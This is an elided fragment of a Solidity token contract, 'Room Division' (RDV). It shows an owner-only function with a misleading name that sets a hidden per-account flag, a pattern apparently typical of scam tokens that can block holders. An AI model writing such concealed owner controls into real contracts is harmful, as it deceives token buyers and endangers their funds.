...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Room Division';
    string constant public symbol = 'RDV';
    ...
    function RDVUpgradeTransactions(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function RDVPerformanceTransactions(address account) public view returns (bool) {
